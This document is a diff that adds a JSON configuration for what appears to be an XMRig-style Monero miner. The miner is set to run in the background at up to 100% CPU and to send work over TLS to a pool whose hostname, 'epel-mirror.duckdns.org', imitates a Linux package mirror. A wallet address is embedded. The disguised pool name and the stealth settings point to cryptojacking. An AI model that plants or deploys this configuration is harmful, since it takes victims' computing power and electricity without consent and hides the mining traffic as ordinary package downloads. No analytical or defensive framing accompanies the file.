@@ -1,0 +1,35 @@
+{
+    "av": 0,
+    "background": true,
+    "cpu-affinity": null,
+    "cpu-priority": 5,
+    "donate-level": 1,
+    "log-file": null,
+    "max-cpu-usage": 100,
+    "print-time": 30,
+    "retries": 3,
+    "retry-pause": 10,
+    "safe": false,
+    "threads": null,
+    "pools": [
+        {
+            "url": "epel-mirror.duckdns.org:443",
+            "user": "49VWaDXzza32Cf5kcHDJgwDyYG9SbQYmf7ZWyBq1PYcmf5fP88pauGRFWAfG5a8rZdRdLd5WPCCLw9rf8RboxNSN5rxiRLc",
+            "pass": "z",
+            "algo": "rx/0",
+            "coin": "monero",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": false,
+            "variant": -1,
+            "enabled": true,
+            "tls": true,
+            "tls-fingerprint": null
+        }
+    ],
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "worker-id": null
+    }
+}
